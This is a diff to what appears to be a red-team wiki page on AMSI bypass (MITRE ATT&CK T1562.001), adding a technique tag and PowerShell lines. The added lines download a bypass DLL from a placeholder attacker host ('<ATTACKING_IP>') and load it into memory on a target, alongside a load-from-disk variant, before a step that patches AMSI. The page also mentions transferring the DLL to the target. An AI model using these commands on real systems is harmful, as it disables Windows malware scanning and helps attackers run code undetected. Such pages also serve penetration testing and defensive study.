@@ -1,3 +1,7 @@
+---
+description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.001'
+---
+
 # AMSI bypass
 
 ## Theory
@@ -179,12 +183,12 @@ $ mcs -t:library AMSIBypass.cs
 Then we can transfer the DLL to the target (using http-server, or smb for example) and load the Assembly
 
 ```powershell
-#Load assembly
-PS> [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(".\amsiBypass.dll"))
+#Load assembly from memory
+$data=(New-Object Net.Webclient).DownloadData('http://<ATTACKING_IP>/AMSIBypass.dll')
+[System.Reflection.Assembly]::Load($data)
 
-GAC    Version        Location
----    -------        --------
-False  v4.0.30319
+#Load assembly from disk
+PS> [System.Reflection.Assembly]::Load([IO.File]::ReadAllBytes(".\AMSIBypass.dll"))
 ```
 
 Call function that patch AMSI
